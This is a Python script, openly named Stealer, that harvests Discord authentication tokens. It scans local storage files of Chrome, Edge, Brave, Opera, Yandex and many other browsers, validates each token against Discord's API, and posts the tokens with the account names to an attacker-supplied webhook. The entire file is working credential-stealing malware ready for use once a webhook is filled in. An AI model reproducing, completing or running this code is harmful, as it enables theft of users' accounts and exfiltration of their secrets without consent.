from re import findall
import httpx, os


def generate_header(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 "
                      "Safari/537.11 "
    }
    if token:
        headers.update({"Authorization": token})
    return headers



class Stealer():
    def __init__(self):
        self.webhook = "PUT WEBHOOK HERE"
        self.name = "Stealer"
        self.appdata = os.getenv("LOCALAPPDATA")
        self.roaming = os.getenv("APPDATA")
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]{120}"
        self.tokens = []
        self.get_tokens()
        self.send_info()

    def get_tokens(self):

        all_paths = {
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb',
            'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb',
            'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb',
            'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb',
            'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb',
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb',
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb',
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb',
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb',
            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb',
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb',
            'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb',
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb',
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb',
            'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb',
            'Chromium': self.appdata + r'\\Chromium\\User Data\\Default\\Local Storage\\leveldb',
            'Mozilla Firefox': self.roaming + r'\\Mozilla\\Firefox\\Profiles'
        }

        for _, path in all_paths.items():
            if os.path.exists(path):
                for filename in os.listdir(path):
                    if not filename.endswith('.log') and not filename.endswith('.ldb'):
                        print(os.listdir(path))
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{filename}', errors='ignore').readlines() if
                                 x.strip()]:
                        for token in findall(self.regex, line):
                            r = httpx.get("https://discord.com/api/v9/users/@me", headers=generate_header(token))
                            if r.status_code == 200:
                                if token in self.tokens:
                                    continue
                                self.tokens.append(token)

    def send_info(self):

        formatted_requests = []

        for token in self.tokens:
            header = httpx.get("https://discord.com/api/v9/users/@me", headers=generate_header(token)).json()
            name = header['username'] + "#" + header['discriminator']
            formatted_requests.append(f'Name: `{name}` | Tokens: ||{token}||')

        print(formatted_requests)

        httpx.post(self.webhook, json={"content": "@everyone", "embeds": [
            {"Title": self.name, "color": 0xCC1A1A, "description": "tokens: \n".join(formatted_requests)}]})


if __name__ == "__main__":
    Stealer()
